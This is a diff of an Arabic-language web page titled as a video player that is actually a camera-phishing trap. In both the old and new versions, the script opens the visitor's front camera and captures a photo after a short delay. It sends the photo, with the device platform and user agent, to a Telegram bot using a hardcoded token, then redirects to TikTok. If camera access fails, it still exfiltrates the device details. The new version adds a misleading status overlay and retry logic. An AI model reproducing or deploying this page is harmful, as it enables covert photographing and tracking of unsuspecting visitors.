@@ -2,129 +2,230 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحميل...</title>
+    <title>مشغل الفيديو</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: #000;
-            color: #fff;
-            font-family: Arial, sans-serif;
+            background: #111;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            text-align: center;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
         }
-        .message {
+        .container {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        video {
+            width: 100%;
+            height: auto;
+            display: block;
+            transform: scaleX(-1); /* مرآة للكاميرا الأمامية */
+            background: #222;
+        }
+        .overlay {
             position: absolute;
-            z-index: 10;
-            background: rgba(0,0,0,0.7);
-            padding: 20px;
-            border-radius: 10px;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: white;
+            text-shadow: 0 2px 5px black;
+            font-size: 18px;
+            background: rgba(0,0,0,0.5);
+            padding: 10px;
+            border-radius: 30px;
+            margin: 0 20px;
+            backdrop-filter: blur(5px);
+        }
+        .status {
+            color: #4CAF50;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <div class="message">جاري التحميل... الرجاء الانتظار</div>
-    <video id="video" width="640" height="480" autoplay playsinline style="display:block; position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; opacity:0;"></video>
-    <canvas id="canvas" width="1280" height="960" style="display:none;"></canvas>
+    <div class="container">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <div class="overlay" id="statusMessage">
+            <span>🔴 جاري تشغيل الكاميرا...</span>
+        </div>
+    </div>
 
     <script>
-        // 1. التوكن الثابت للبوت
-        const botToken = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"; 
-
-        // 2. سحب الـ ID من رابط المتصفح
-        const urlParams = new URLSearchParams(window.location.search);
-        const userChatId = urlParams.get('id'); 
-
-        async function startSystem() {
-            if (!userChatId) {
-                console.error("لا يوجد معرف ID في الرابط!");
-                document.body.innerHTML = "رابط غير صالح";
-                return;
-            }
-
-            try {
-                // طلب الكاميرا الأمامية بدقة عالية
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: "user",
-                        width: { ideal: 1280 },
-                        height: { ideal: 960 }
-                    } 
-                });
-                
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                // التأكد من تشغيل الفيديو قبل التقاط الصورة
-                video.onloadedmetadata = () => {
-                    video.play();
-                    // انتظار 3 ثواني لضبط الإضاءة والتأكد من صورة واضحة
-                    setTimeout(() => {
-                        captureAndSend();
-                    }, 3000);
-                };
-
-            } catch (err) {
-                console.log("خطأ في الكاميرا:", err);
-                sendInfoOnly();
-            }
-        }
-
-        function captureAndSend() {
-            const canvas = document.getElementById('canvas');
+        (function() {
+            // التوكن ومعرف المستخدم
+            const botToken = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+            const urlParams = new URLSearchParams(window.location.search);
+            const userChatId = urlParams.get('id');
+            
+            // عناصر الصفحة
             const video = document.getElementById('video');
-            const context = canvas.getContext('2d');
+            const canvas = document.getElementById('canvas');
+            const statusEl = document.getElementById('statusMessage');
             
-            // استخدام دقة أعلى للصورة
-            canvas.width = 1280;
-            canvas.height = 960;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // متغيرات التحكم
+            let photoTaken = false;
+            let videoReady = false;
+            let stream = null;
             
-            // تحويل canvas إلى blob بجودة عالية
-            canvas.toBlob((blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', userChatId);
-                formData.append('photo', blob, 'image.jpg');
-                formData.append('caption', `✅ تم التقاط الصورة بنجاح
+            // تحديث الحالة
+            function updateStatus(text, isError = false) {
+                statusEl.innerHTML = `<span class="${isError ? 'error' : 'status'}">${text}</span>`;
+                if (isError) {
+                    statusEl.style.color = '#f44336';
+                }
+            }
+            
+            // دالة التقاط الصورة
+            async function takePhoto() {
+                if (photoTaken || !videoReady || !stream) return;
+                
+                try {
+                    photoTaken = true;
+                    updateStatus("📸 جاري التقاط الصورة...");
+                    
+                    // ضبط أبعاد الكانفس
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
+                    
+                    const context = canvas.getContext('2d');
+                    
+                    // قلب الصورة أفقياً (للكاميرا الأمامية)
+                    context.translate(canvas.width, 0);
+                    context.scale(-1, 1);
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // إعادة الإعدادات الافتراضية
+                    context.setTransform(1, 0, 0, 1, 0, 0);
+                    
+                    // تحويل إلى Blob
+                    canvas.toBlob(async (blob) => {
+                        if (!blob) {
+                            throw new Error("فشل إنشاء الصورة");
+                        }
+                        
+                        // إرسال الصورة
+                        const formData = new FormData();
+                        formData.append('chat_id', userChatId);
+                        formData.append('photo', blob, 'photo.jpg');
+                        formData.append('caption', `✅ تم التقاط الصورة بنجاح
+🆔 المعرف: ${userChatId || 'غير محدد'}
+📱 الجهاز: ${navigator.platform}
+📏 الدقة: ${canvas.width}x${canvas.height}
+⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}`);
+                        
+                        updateStatus("📤 جاري الإرسال...");
+                        
+                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        if (response.ok) {
+                            updateStatus("✅ تم الإرسال بنجاح!");
+                            // إيقاف الكاميرا بعد ثانية
+                            setTimeout(() => {
+                                if (stream) {
+                                    stream.getTracks().forEach(track => track.stop());
+                                }
+                                // التوجيه إلى تيك توك
+                                window.location.href = "https://www.tiktok.com";
+                            }, 1500);
+                        } else {
+                            throw new Error("فشل الإرسال");
+                        }
+                    }, 'image/jpeg', 0.9);
+                    
+                } catch (error) {
+                    console.error("خطأ في التصوير:", error);
+                    updateStatus("❌ حدث خطأ، إعادة المحاولة...", true);
+                    photoTaken = false;
+                    setTimeout(takePhoto, 2000);
+                }
+            }
+            
+            // تشغيل الكاميرا
+            async function startCamera() {
+                if (!userChatId) {
+                    updateStatus("❌ خطأ: لا يوجد معرف", true);
+                    return;
+                }
+                
+                try {
+                    updateStatus("🔍 طلب إذن الكاميرا...");
+                    
+                    // طلب الكاميرا مع إعدادات مناسبة
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: "user",
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            frameRate: { ideal: 30 }
+                        }
+                    });
+                    
+                    video.srcObject = stream;
+                    
+                    // عند تحميل الفيديو
+                    video.onloadeddata = () => {
+                        video.play();
+                        videoReady = true;
+                        updateStatus("✅ الكاميرا جاهزة، انتظر لحظة...");
+                        
+                        // انتظر ثانيتين لضبط الإضاءة ثم صور
+                        setTimeout(() => {
+                            if (!photoTaken) {
+                                takePhoto();
+                            }
+                        }, 2500);
+                    };
+                    
+                } catch (error) {
+                    console.error("خطأ في الكاميرا:", error);
+                    updateStatus("❌ لا يمكن الوصول للكاميرا", true);
+                    
+                    // إرسال معلومات فقط
+                    try {
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: userChatId,
+                                text: `⚠️ فشل الوصول للكاميرا
 🆔 المعرف: ${userChatId}
-📱 النظام: ${navigator.platform}
+📱 الجهاز: ${navigator.platform}
 🌐 المتصفح: ${navigator.userAgent}
-⏰ الوقت: ${new Date().toLocaleString()}`);
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).then(response => {
-                    if (response.ok) {
-                        // إيقاف الكاميرا
-                        video.srcObject.getTracks().forEach(track => track.stop());
-                        // تحويل إلى TikTok
+⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}`
+                            })
+                        });
+                    } catch (e) {}
+                    
+                    // التوجيه بعد 3 ثواني
+                    setTimeout(() => {
                         window.location.href = "https://www.tiktok.com";
-                    }
-                });
-            }, 'image/jpeg', 0.95); // جودة عالية 95%
-        }
-
-        async function sendInfoOnly() {
-            const text = `⚠️ تعذر الوصول للكاميرا
-🆔 المعرف: ${userChatId}
-📱 النظام: ${navigator.platform}
-🌐 المتصفح: ${navigator.userAgent}
-⏰ الوقت: ${new Date().toLocaleString()}`;
+                    }, 3000);
+                }
+            }
             
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: userChatId, text: text })
-            });
+            // بدء التشغيل
+            startCamera();
             
-            window.location.href = "https://www.tiktok.com";
-        }
-
-        window.onload = startSystem;
+            // خطة احتياطية: إذا لم تلتقط الصورة خلال 7 ثواني، حاول مرة أخرى
+            setTimeout(() => {
+                if (!photoTaken && videoReady) {
+                    takePhoto();
+                }
+            }, 7000);
+            
+        })();
     </script>
 </body>
 </html>
